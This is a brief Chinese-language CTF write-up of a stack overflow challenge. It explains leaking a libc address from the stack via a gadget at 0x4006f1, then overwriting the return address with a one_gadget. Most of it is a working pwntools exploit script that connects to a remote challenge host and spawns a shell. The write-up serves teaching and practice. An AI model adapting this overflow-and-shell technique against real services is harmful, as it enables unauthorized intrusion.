测试漏洞为栈溢出

这题开始以为是BROP，结果爆了返回地址和rdi_ret和rsi_ret的地址

没有爆出来`puts`或者`write`的地址，寻思着他难道用的是`printf`

发现在`0x4006f1`的地址可以输出buf栈的内容，其中还有有个libc的地址。。。见鬼

这题就没啥了，libc和本地Ubuntu16.04的库一样通过栈里面的地址也可以确认

又知道libc的基地址，直接覆盖ret为one_gadget

```python
from pwn import *
#context.log_level = "debug"
main = 0x4006ce
__libc_csu_init = 0x400720
pop_r15_ret=0x40077a
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

#0x6f1
p = remote("34.92.37.22",10000)
print p.recvuntil("pwn!\n")
payload = 'A'*0x28+p64(0x4006f1)
p.sendline(payload)
p.recv(0xd0)
libc.address=u64(p.recv(6)+'\x00\x00')-0x5f1168
success("libc.address-->"+hex(libc.address))
payload = "A"*0x28+p64(libc.address+0x45216)
p.sendline(payload)
p.interactive()
```

![](https://i.loli.net/2019/04/29/5cc624da80d38.png)

